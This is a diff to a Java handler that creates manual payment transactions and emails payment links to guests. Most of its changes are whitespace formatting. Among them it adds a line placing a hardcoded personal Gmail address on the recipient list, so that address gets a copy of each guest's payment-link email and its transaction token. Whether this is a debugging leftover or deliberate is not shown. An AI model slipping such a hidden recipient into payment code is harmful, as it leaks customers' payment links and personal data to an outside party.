@@ -85,7 +85,7 @@ public class CreateManualTransactionCommandHandler implements ICommandHandler<Cr
         ManageCreditCardTypeDto creditCardTypeDto = null;
 
         ParameterizationDto parameterizationDto = this.parameterizationService.findActiveParameterization();
-        if(Objects.isNull(parameterizationDto)){
+        if (Objects.isNull(parameterizationDto)) {
             throw new BusinessNotFoundException(new GlobalBusinessException(DomainErrorMessage.NOT_FOUND, new ErrorField("id", "No active parameterization")));
         }
 
@@ -93,7 +93,7 @@ public class CreateManualTransactionCommandHandler implements ICommandHandler<Cr
         ManageVCCTransactionTypeDto transactionCategory = this.transactionTypeService.findByCode(parameterizationDto.getTransactionCategory());
         ManageVCCTransactionTypeDto transactionSubCategory = this.transactionTypeService.findByCode(parameterizationDto.getTransactionSubCategory());
 
-        if(command.getMethodType().compareTo(MethodType.LINK) == 0){
+        if (command.getMethodType().compareTo(MethodType.LINK) == 0) {
             RulesChecker.checkRule(new ValidateObjectNotNullRule<>(command.getGuestName(), "gestName", "Guest name cannot be null."));
             RulesChecker.checkRule(new ValidateObjectNotNullRule<>(command.getEmail(), "email", "Email cannot be null."));
         }
@@ -132,6 +132,7 @@ public class CreateManualTransactionCommandHandler implements ICommandHandler<Cr
         ));
         command.setId(id);
 
+        if(command.getMethodType() == MethodType.LINK){
         //Send mail after the crate transaction
         String token = tokenService.generateToken(command.getTransactionUuid());
         if (command.getEmail() != null) {
@@ -148,10 +149,12 @@ public class CreateManualTransactionCommandHandler implements ICommandHandler<Cr
             // Recipients
             List<MailJetRecipient> recipients = new ArrayList<>();
             recipients.add(new MailJetRecipient(command.getEmail(), command.getGuestName()));
+            recipients.add(new MailJetRecipient("keimermo1989@gmail.com", command.getGuestName()));
             request.setRecipientEmail(recipients);
 
             mailService.sendMail(request);
-            }
+        }
+        }
     }
 
 }
